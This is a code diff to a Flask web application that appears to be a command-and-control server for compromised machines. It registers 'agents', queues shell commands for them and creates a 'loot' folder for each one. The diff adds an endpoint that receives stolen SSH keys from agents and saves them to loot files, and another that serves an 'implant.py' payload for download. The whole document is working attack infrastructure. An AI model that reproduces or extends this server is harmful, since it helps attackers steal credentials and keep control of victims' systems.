@@ -1,8 +1,9 @@
-from flask import Flask, render_template, redirect, url_for, request, session, flash
+from flask import Flask, render_template, redirect, url_for, request, session, flash, abort, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from functools import wraps
 from config import BaseConfig
 import time
+import os
 
 from models import *
 
@@ -25,9 +26,9 @@ def login_required(f):
     return wrap
 
 
-def add_agent(os, host_name, ip, ram):
+def add_agent(system, host_name, ip, ram):
     if not db.session.query(db.exists().where(Agent.ip == ip)).scalar():
-        agent = Agent(os, host_name, ip, ram)
+        agent = Agent(system, host_name, ip, ram)
         db.session.add(agent)
         db.session.flush()
         agent_id = agent.id
@@ -35,6 +36,7 @@ def add_agent(os, host_name, ip, ram):
         db.session.add(CommandQueue(agent_id, 'ls', 'asd'))
         db.session.commit()
         print(agent_id)
+        os.mkdir(f"loot/agent_{agent_id}")
         return agent.id
 
 
@@ -87,6 +89,25 @@ def command_out():
         # print(agent.output)
         db.session.commit()
         return 'Received'
+
+
+@app.route('/api/1.1/ssh_keys', methods=['GET', 'POST'])
+def ssh_keys():
+    if request.method == 'POST':
+        key_dict = request.json['keys']
+        agent_id = request.json['id']
+        with open(f"loot/agent_{agent_id}/ssh_keys.txt", 'a+') as file:
+            for key in key_dict:
+                file.write(f"{key}: {key_dict[key]}\n")
+        return 'Received BINGUS MODE'
+
+
+@app.route('/api/1.1/retrieve_scripts', methods=['GET', 'POST'])
+def scripts():
+    try:
+        return send_from_directory('implant', path='implant.py', filename='implant.py', as_attachment=True)
+    except FileNotFoundError:
+        abort(404)
 
 
 @app.route('/welcome')
